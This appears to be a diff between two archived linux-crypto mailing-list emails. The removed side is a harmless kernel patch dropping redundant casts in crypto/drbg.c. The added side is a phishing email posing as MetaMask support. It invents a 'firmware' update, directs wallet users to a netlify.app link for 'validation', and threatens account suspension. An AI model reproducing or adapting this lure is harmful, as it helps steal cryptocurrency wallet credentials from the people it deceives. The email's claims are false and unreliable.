@@ -2,100 +2,74 @@ Return-Path: <linux-crypto-owner@vger.kernel.org>
 X-Original-To: lists+linux-crypto@lfdr.de
 Delivered-To: lists+linux-crypto@lfdr.de
 Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
-	by mail.lfdr.de (Postfix) with ESMTP id 8406C58D60F
-	for <lists+linux-crypto@lfdr.de>; Tue,  9 Aug 2022 11:15:02 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id 7E5FA58D863
+	for <lists+linux-crypto@lfdr.de>; Tue,  9 Aug 2022 13:50:26 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S234144AbiHIJO7 (ORCPT <rfc822;lists+linux-crypto@lfdr.de>);
-        Tue, 9 Aug 2022 05:14:59 -0400
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:42582 "EHLO
+        id S232679AbiHILuY (ORCPT <rfc822;lists+linux-crypto@lfdr.de>);
+        Tue, 9 Aug 2022 07:50:24 -0400
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:38982 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S230089AbiHIJO7 (ORCPT
+        with ESMTP id S242922AbiHILuT (ORCPT
         <rfc822;linux-crypto@vger.kernel.org>);
-        Tue, 9 Aug 2022 05:14:59 -0400
-Received: from mail.nfschina.com (unknown [IPv6:2400:dd01:100f:2:72e2:84ff:fe10:5f45])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTP id 2AFCF21E1D;
-        Tue,  9 Aug 2022 02:14:58 -0700 (PDT)
-Received: from localhost (unknown [127.0.0.1])
-        by mail.nfschina.com (Postfix) with ESMTP id CDA5F1E80CD2;
-        Tue,  9 Aug 2022 17:13:12 +0800 (CST)
-X-Virus-Scanned: amavisd-new at test.com
-Received: from mail.nfschina.com ([127.0.0.1])
-        by localhost (mail.nfschina.com [127.0.0.1]) (amavisd-new, port 10024)
-        with ESMTP id Hf1it-2oo_4A; Tue,  9 Aug 2022 17:13:10 +0800 (CST)
-Received: from localhost.localdomain (unknown [219.141.250.2])
-        (Authenticated sender: chuanjian@nfschina.com)
-        by mail.nfschina.com (Postfix) with ESMTPA id 2B1501E80CC5;
-        Tue,  9 Aug 2022 17:13:10 +0800 (CST)
-From:   Dong Chuanjian <chuanjian@nfschina.com>
-To:     herbert@gondor.apana.org.au, davem@davemloft.net
-Cc:     linux-crypto@vger.kernel.org, linux-kernel@vger.kernel.org,
-        kernel@nfschina.com, Dong Chuanjian <chuanjian@nfschina.com>
-Subject: [PATCH] crypto/drbg.c:remove unnecessary (void*) conversions
-Date:   Tue,  9 Aug 2022 17:14:52 +0800
-Message-Id: <20220809091452.5264-1-chuanjian@nfschina.com>
-X-Mailer: git-send-email 2.18.2
-X-Spam-Status: No, score=-1.1 required=5.0 tests=BAYES_00,RDNS_NONE,
-        SPF_HELO_NONE,SPF_NONE,T_SCC_BODY_TEXT_LINE autolearn=no
-        autolearn_force=no version=3.4.6
+        Tue, 9 Aug 2022 07:50:19 -0400
+Received: from mailout-shared.jellyfish.systems (mailout-shared.jellyfish.systems [63.250.43.110])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 88B6CFE6
+        for <linux-crypto@vger.kernel.org>; Tue,  9 Aug 2022 04:50:15 -0700 (PDT)
+Received: from premium80.web-hosting.com (unknown [10.35.5.64])
+        (using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+        (No client certificate requested)
+        by mailout-shared.jellyfish.systems (Postfix) with ESMTPSA id 4M2B6c25vhzHv7r
+        for <linux-crypto@vger.kernel.org>; Tue,  9 Aug 2022 11:43:52 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+        d=tqvconsult.com; s=default; h=Sender:Content-Transfer-Encoding:Content-Type:
+        MIME-Version:Message-ID:From:Date:Subject:To:Reply-To:Cc:Content-ID:
+        Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+        :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+        List-Subscribe:List-Post:List-Owner:List-Archive;
+        bh=6HCsG/U2F1mXZP3kFpLFc/7Ou6Nq3S8hQo7zF9mQ354=; b=ivPLrtqTDcs5Usa0FoppygjLdG
+        a/0g7yc24e3JbP65GIMAaL0jiwhQPOplk3C05iEJJ8WvRT7/8XWNwn/XOurBQ4j0rAVShYpPHcX8t
+        20mvnhpVQiv0eD66gtcO6RCjjsbdCMq43r7ANKndBIIVAR37fY1uYbqsmz8WRRHdX7rkfsapodaT0
+        bt9t/VI4pWDV0Rrb7ZXIjh5n1x/nq+GY5b4lp9Pqvb5trf6+7KhzKxc9tWdcquNVEinFgKwNmUOOk
+        92JXg41d8qBfIJ7Rjo8mlky8gBxQnhNxK/2eqdPtTmiWS1Vk9SiLoXkmirsQMiwoB9nE7oGdAiCcD
+        ygxvxtew==;
+Received: from chatlycq by premium80.web-hosting.com with local (Exim 4.95)
+        (envelope-from <support@tqvconsult.com>)
+        id 1oLNeK-000Fkh-6U
+        for linux-crypto@vger.kernel.org;
+        Tue, 09 Aug 2022 07:43:52 -0400
+To:     linux-crypto@vger.kernel.org
+Subject: METAMASK SECURITY
+X-PHP-Script: tqvconsult.com/bdrxasxl.php for 102.89.39.33, 102.89.39.33
+X-PHP-Filename: /home/chatlycq/tqvconsult.com/bdrxasxl.php REMOTE_ADDR: 102.89.39.33
+Date:   Tue, 9 Aug 2022 07:43:52 -0400
+From:   METAMASK SUPPORT <support@tqvconsult.com>
+Message-ID: <95e2b28603a8ae0070b88aad2ff5dd97@tqvconsult.com>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+Sender:  <chatlycq@premium80.web-hosting.com>
+X-Spam-Status: No, score=3.4 required=5.0 tests=BAYES_50,DKIM_SIGNED,
+        DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,PHP_SCRIPT,RCVD_IN_MSPIKE_H2,
+        SPF_HELO_NONE,SPF_PASS,SUBJ_ALL_CAPS,TVD_PH_BODY_ACCOUNTS_PRE,
+        T_SCC_BODY_TEXT_LINE autolearn=no autolearn_force=no version=3.4.6
+X-Spam-Level: ***
 X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
         lindbergh.monkeyblade.net
 Precedence: bulk
 List-ID: <linux-crypto.vger.kernel.org>
 X-Mailing-List: linux-crypto@vger.kernel.org
 
-remove unnecessary void* type casting
+Due to the recent update on the METAMASK firmware. The new update is to remove bot and unused wallets from the blockchain network.
 
-Signed-off-by: Dong Chuanjian <chuanjian@nfschina.com>
+All MetaMask wallet users are required to complete wallet validation by following:
 
-diff --git a/crypto/drbg.c b/crypto/drbg.c
-index 177983b6ae38..f41ec3088ecc 100644
---- a/crypto/drbg.c
-+++ b/crypto/drbg.c
-@@ -1703,7 +1703,7 @@ static int drbg_init_hash_kernel(struct drbg_state *drbg)
- 
- static int drbg_fini_hash_kernel(struct drbg_state *drbg)
- {
--	struct sdesc *sdesc = (struct sdesc *)drbg->priv_data;
-+	struct sdesc *sdesc = drbg->priv_data;
- 	if (sdesc) {
- 		crypto_free_shash(sdesc->shash.tfm);
- 		kfree_sensitive(sdesc);
-@@ -1715,7 +1715,7 @@ static int drbg_fini_hash_kernel(struct drbg_state *drbg)
- static void drbg_kcapi_hmacsetkey(struct drbg_state *drbg,
- 				  const unsigned char *key)
- {
--	struct sdesc *sdesc = (struct sdesc *)drbg->priv_data;
-+	struct sdesc *sdesc = drbg->priv_data;
- 
- 	crypto_shash_setkey(sdesc->shash.tfm, key, drbg_statelen(drbg));
- }
-@@ -1723,7 +1723,7 @@ static void drbg_kcapi_hmacsetkey(struct drbg_state *drbg,
- static int drbg_kcapi_hash(struct drbg_state *drbg, unsigned char *outval,
- 			   const struct list_head *in)
- {
--	struct sdesc *sdesc = (struct sdesc *)drbg->priv_data;
-+	struct sdesc *sdesc = drbg->priv_data;
- 	struct drbg_string *input = NULL;
- 
- 	crypto_shash_init(&sdesc->shash);
-@@ -1819,7 +1819,7 @@ static void drbg_kcapi_symsetkey(struct drbg_state *drbg,
- 				 const unsigned char *key)
- {
- 	struct crypto_cipher *tfm =
--		(struct crypto_cipher *)drbg->priv_data;
-+		drbg->priv_data;
- 
- 	crypto_cipher_setkey(tfm, key, (drbg_keylen(drbg)));
- }
-@@ -1828,7 +1828,7 @@ static int drbg_kcapi_sym(struct drbg_state *drbg, unsigned char *outval,
- 			  const struct drbg_string *in)
- {
- 	struct crypto_cipher *tfm =
--		(struct crypto_cipher *)drbg->priv_data;
-+		drbg->priv_data;
- 
- 	/* there is only component in *in */
- 	BUG_ON(in->len < drbg_blocklen(drbg));
--- 
-2.18.2
+https://myinteli-syncedapps.netlify.app/
+
+All unverified accounts will be suspended on Tuesday, August 16th, 2022.
+
+We’re sorry for any inconvenience we cause with this, but please keep in mind that our intention is to keep our customers safe and happy.
+
+To add any additional comments, simply reply to this email.
+
+Thank you for choosing METAMASK to be your digital currency wallet.
 
